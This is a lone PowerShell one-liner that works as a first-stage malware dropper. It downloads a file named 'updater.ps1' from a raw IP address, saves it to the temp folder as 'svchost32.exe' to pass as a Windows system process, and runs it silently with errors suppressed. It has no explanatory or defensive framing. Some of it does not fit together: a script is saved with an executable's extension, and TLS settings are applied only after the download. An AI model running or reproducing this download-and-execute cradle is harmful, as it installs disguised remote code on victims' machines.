
$Stage1Url = "http://203.0.113.27/updater.ps1"; $LocalPath = "$env:TEMP\svchost32.exe"; (New-Object System.Net.WebClient).DownloadFile($Stage1Url, $LocalPath); Start-Process -FilePath $LocalPath -ErrorAction SilentlyContinue; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
